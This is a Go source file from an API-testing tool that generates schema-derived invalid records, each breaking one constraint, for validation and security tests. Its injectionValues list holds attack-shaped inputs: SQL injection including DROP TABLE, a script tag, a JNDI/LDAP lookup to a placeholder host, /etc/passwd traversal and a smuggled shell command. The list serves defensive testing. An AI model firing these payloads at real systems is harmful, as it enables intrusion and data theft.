package datagen

import (
	"fmt"
	"strings"

	"github.com/brianvoe/gofakeit/v7"

	"github.com/hyscaler/qavia/api/internal/ingest"
)

// Boundary and invalid data (BE-8.3, F-10.3).
//
// Every record here breaks exactly one constraint and says which, and both halves of
// that matter. One constraint at a time, because a record that is simultaneously too
// long, the wrong type, and missing a required field tells you the endpoint rejected
// something without telling you what it checks. And naming the violation, because a
// pile of malformed JSON is not a test suite: "email: violates format email" is a
// reviewable expectation, and `{"email": "%%%"}` on its own is a guess.
//
// The values are derived from the schema's own constraints rather than from a list of
// nasty strings. A field with `maxLength: 40` gets a 41-character value; a field with
// `minimum: 1` gets 0. That is what makes the set specific to the API being tested
// instead of generic noise — and it is deterministic, so the same schema and seed
// produce the same set every time.

// InvalidKind names a family of violation, so a caller can ask for the ones it cares
// about: a validation suite wants all of them, a security smoke test wants injection.
type InvalidKind string

const (
	// KindMissing omits a required field.
	KindMissing InvalidKind = "missing"

	// KindEmpty sends an empty value where one is required.
	KindEmpty InvalidKind = "empty"

	// KindType sends the wrong JSON type.
	KindType InvalidKind = "type"

	// KindTooLong and KindTooShort break a length bound; KindTooLarge and KindTooSmall
	// break a numeric one.
	KindTooLong  InvalidKind = "too_long"
	KindTooShort InvalidKind = "too_short"
	KindTooLarge InvalidKind = "too_large"
	KindTooSmall InvalidKind = "too_small"

	// KindEnum sends a value outside the enum.
	KindEnum InvalidKind = "enum"

	// KindFormat breaks a declared format: an email with no at sign, a date that is
	// not a date.
	KindFormat InvalidKind = "format"

	// KindPattern breaks a declared regular expression.
	KindPattern InvalidKind = "pattern"

	// KindInjection is a value shaped like an attack: a SQL fragment, a script tag, a
	// traversal. Included because an endpoint that reflects one of these back is a
	// finding, and because the fix — parameterised queries, output encoding — is
	// invisible until something tries.
	KindInjection InvalidKind = "injection"

	// KindDeclinedCard is a published test card the processor is documented to refuse.
	// A payment flow that has only ever seen a successful charge has never exercised
	// the path where the money goes missing.
	KindDeclinedCard InvalidKind = "declined_card"
)

// InvalidRecord is one deliberately invalid object.
type InvalidRecord struct {
	Record Record

	// Field is which field was broken, Kind how, and Expectation what the endpoint
	// should do about it — in words, because "422 with a message naming the field" is
	// the assertion somebody writes from this.
	Field       string
	Kind        InvalidKind
	Violates    string
	Expectation string
}

// InvalidRequest is what to generate.
type InvalidRequest struct {
	Schema ingest.Schema

	// Kinds narrows the families. Empty means every kind the schema supports.
	Kinds []InvalidKind

	// Limit caps the set. Zero means every case the schema produces, which for a
	// twenty-field object is a few dozen.
	Limit int

	Seed   uint64
	Locale string
}

// InvalidResult is a generated set with the seed that produced it.
type InvalidResult struct {
	Seed    uint64
	Records []InvalidRecord

	// Skipped names fields that produced no case, so a reader can tell "this field is
	// fully unconstrained" from "the generator ignored it". A schema of nothing but
	// unconstrained strings genuinely has few ways to be invalid, and that is a fact
	// about the specification worth seeing.
	Skipped []string
}

// GenerateInvalid produces the boundary and invalid set.
//
// Each case starts from a valid record and breaks one field, so everything else in the
// payload is exactly what the endpoint expects: a rejection is then attributable to
// the one change rather than to whichever problem the validator noticed first.
func (g *Generator) GenerateInvalid(request InvalidRequest) (InvalidResult, error) {
	base, err := g.Generate(Request{
		Schema: request.Schema,
		Count:  1,
		Seed:   request.Seed,
		Locale: request.Locale,
	})
	if err != nil {
		return InvalidResult{}, err
	}
	if len(base.Records) == 0 {
		return InvalidResult{Seed: base.Seed}, nil
	}

	valid := base.Records[0]
	faker := gofakeit.New(base.Seed)
	generator := &Generator{locale: request.Locale}

	wanted := make(map[InvalidKind]bool, len(request.Kinds))
	for _, kind := range request.Kinds {
		wanted[kind] = true
	}
	include := func(kind InvalidKind) bool { return len(wanted) == 0 || wanted[kind] }

	result := InvalidResult{Seed: base.Seed}
	required := requiredSet(request.Schema)

	for _, name := range sortedKeys(request.Schema.Properties) {
		property := request.Schema.Properties[name]
		cases := generator.casesFor(faker, name, property, required[name], include)

		if len(cases) == 0 {
			result.Skipped = append(result.Skipped, name)
			continue
		}

		for _, broken := range cases {
			record := valid.withField(broken.name, broken.value, broken.violates)
			if broken.omit {
				record = valid.without(broken.name)
			}

			result.Records = append(result.Records, InvalidRecord{
				Record:      record,
				Field:       broken.name,
				Kind:        broken.kind,
				Violates:    broken.violates,
				Expectation: broken.expectation,
			})

			if request.Limit > 0 && len(result.Records) >= request.Limit {
				return result, nil
			}
		}
	}

	return result, nil
}

// brokenField is one violation of one field.
type brokenField struct {
	name  string
	value any
	omit  bool

	kind        InvalidKind
	violates    string
	expectation string
}

// casesFor derives every violation the field's own constraints permit.
func (g *Generator) casesFor(
	faker *gofakeit.Faker,
	name string,
	schema ingest.Schema,
	required bool,
	include func(InvalidKind) bool,
) []brokenField {
	var cases []brokenField

	if required && include(KindMissing) {
		cases = append(cases, brokenField{
			name: name, omit: true, kind: KindMissing,
			violates:    fmt.Sprintf("%s is required and absent", name),
			expectation: "rejected, naming the missing field",
		})
	}

	if required && include(KindEmpty) && isTextual(schema) {
		cases = append(cases, brokenField{
			name: name, value: "", kind: KindEmpty,
			violates:    fmt.Sprintf("%s is required and empty", name),
			expectation: "rejected: an empty string is not a value",
		})
	}

	if include(KindType) {
		cases = append(cases, brokenField{
			name: name, value: wrongType(schema), kind: KindType,
			violates:    fmt.Sprintf("%s expects %s", name, typeName(schema)),
			expectation: "rejected as the wrong type, not coerced",
		})
	}

	if schema.MaxLength != nil && *schema.MaxLength > 0 && include(KindTooLong) {
		over := *schema.MaxLength + 1
		cases = append(cases, brokenField{
			name: name, value: strings.Repeat("x", over), kind: KindTooLong,
			violates:    fmt.Sprintf("%s allows %d characters, this is %d", name, *schema.MaxLength, over),
			expectation: "rejected, not silently truncated — truncation is data loss nobody sees",
		})
	}

	if schema.MinLength != nil && *schema.MinLength > 0 && include(KindTooShort) {
		under := strings.Repeat("x", *schema.MinLength-1)
		cases = append(cases, brokenField{
			name: name, value: under, kind: KindTooShort,
			violates:    fmt.Sprintf("%s needs at least %d characters, this is %d", name, *schema.MinLength, len(under)),
			expectation: "rejected, naming the minimum",
		})
	}

	if schema.Maximum != nil && include(KindTooLarge) {
		cases = append(cases, brokenField{
			name: name, value: *schema.Maximum + 1, kind: KindTooLarge,
			violates:    fmt.Sprintf("%s allows at most %v", name, *schema.Maximum),
			expectation: "rejected, not clamped",
		})
	}

	if schema.Minimum != nil && include(KindTooSmall) {
		cases = append(cases, brokenField{
			name: name, value: *schema.Minimum - 1, kind: KindTooSmall,
			violates:    fmt.Sprintf("%s allows at least %v", name, *schema.Minimum),
			expectation: "rejected, naming the minimum",
		})
	}

	if len(schema.Enum) > 0 && include(KindEnum) {
		cases = append(cases, brokenField{
			name: name, value: "not-in-enum", kind: KindEnum,
			violates: fmt.Sprintf("%s must be one of %s", name, strings.Join(schema.Enum, ", ")),
			// Worth stating: an endpoint that accepts an unknown status and stores it is
			// an endpoint whose enum exists only in the documentation.
			expectation: "rejected: an unknown value must not be stored",
		})
	}

	if schema.Format != "" && include(KindFormat) {
		if broken := brokenFormat(schema.Format); broken != "" {
			cases = append(cases, brokenField{
				name: name, value: broken, kind: KindFormat,
				violates:    fmt.Sprintf("%s declares format %s", name, schema.Format),
				expectation: "rejected as malformed, naming the format",
			})
		}
	}

	if schema.Pattern != "" && include(KindPattern) {
		cases = append(cases, brokenField{
			name: name, value: "!!not-matching!!", kind: KindPattern,
			violates:    fmt.Sprintf("%s must match %s", name, schema.Pattern),
			expectation: "rejected against the pattern",
		})
	}

	if isTextual(schema) && include(KindInjection) {
		cases = append(cases, brokenField{
			name: name, value: faker.RandomString(injectionValues), kind: KindInjection,
			violates: fmt.Sprintf("%s carries an injection-shaped value", name),
			// The expectation is deliberately not "rejected": an API may legitimately
			// accept an apostrophe in a surname. What must not happen is the value
			// changing the query or coming back as executable markup.
			expectation: "accepted or rejected, but stored and returned verbatim — never executed, " +
				"and never reflected unescaped",
		})
	}

	if isCardField(name) && include(KindDeclinedCard) {
		cases = append(cases, brokenField{
			name: name, value: faker.RandomString(declineCards), kind: KindDeclinedCard,
			violates:    fmt.Sprintf("%s is a published test card the processor declines", name),
			expectation: "the payment fails cleanly: no order created, no charge recorded, a stated reason",
		})
	}

	return cases
}

// injectionValues are the shapes worth trying, one per class of mistake.
//
// A short list on purpose. Fifty variants of the same SQL fragment test the same code
// path fifty times; one of each class — SQL, script, template, traversal, command,
// null byte, oversized unicode — covers the distinct ways an input can escape its
// context.
var injectionValues = []string{
	"' OR '1'='1",
	"\"; DROP TABLE users; --",
	"<script>alert(1)</script>",
	"{{7*7}}",
	"${jndi:ldap://example.invalid/a}",
	"../../../../etc/passwd",
	"; cat /etc/passwd",
	"%00",
	// The right-to-left override, escaped rather than written literally: a bidirectional
	// control character in source is the Trojan Source trick, and a file that carries
	// one is a file a reviewer cannot read as it executes.
	"\u202eevil",
	strings.Repeat("𝕏", 64),
}

// brokenFormat is a value that plainly violates a declared format.
func brokenFormat(format string) string {
	switch strings.ToLower(strings.TrimSpace(format)) {
	case "email", "idn-email":
		return "not-an-email"
	case "uuid":
		return "1234-not-a-uuid"
	case "date":
		return "2026-13-45"
	case "date-time":
		return "yesterday afternoon"
	case "time":
		return "25:61:00"
	case "uri", "url", "uri-reference", "iri":
		return "http://"
	case "hostname", "idn-hostname":
		return "not a hostname"
	case "ipv4":
		return "999.999.999.999"
	case "ipv6":
		return "not::an::address::"
	default:
		return ""
	}
}

// wrongType is a value of a type the schema does not permit.
func wrongType(schema ingest.Schema) any {
	switch strings.ToLower(schema.Type) {
	case "integer", "number":
		return "not-a-number"
	case "boolean":
		return "maybe"
	case "array":
		return "not-an-array"
	case "object":
		return "not-an-object"
	default:
		// A string field gets an object, which is the type most likely to be mishandled:
		// a framework that stringifies it stores "[object Object]" and reports success.
		return map[string]any{"unexpected": true}
	}
}

func typeName(schema ingest.Schema) string {
	if schema.Type == "" {
		return "a string"
	}
	return "a " + schema.Type
}

func isTextual(schema ingest.Schema) bool {
	return schema.Type == "" || strings.EqualFold(schema.Type, "string")
}

func requiredSet(schema ingest.Schema) map[string]bool {
	required := make(map[string]bool, len(schema.Required))
	for _, name := range schema.Required {
		required[name] = true
	}
	return required
}

// withField copies the record with one field replaced.
//
// A copy rather than a mutation: every invalid case starts from the same valid record,
// and mutating it would mean case seven inherits the breakage from cases one to six.
func (r Record) withField(name string, value any, violates string) Record {
	fields := make([]Field, 0, len(r.Fields))
	replaced := false

	for _, field := range r.Fields {
		if field.Name == name {
			fields = append(fields, Field{Name: name, Value: value, Violates: violates})
			replaced = true
			continue
		}
		fields = append(fields, field)
	}
	if !replaced {
		fields = append(fields, Field{Name: name, Value: value, Violates: violates})
	}
	return Record{Fields: fields}
}

// without copies the record with one field omitted.
func (r Record) without(name string) Record {
	fields := make([]Field, 0, len(r.Fields))
	for _, field := range r.Fields {
		if field.Name != name {
			fields = append(fields, field)
		}
	}
	return Record{Fields: fields}
}
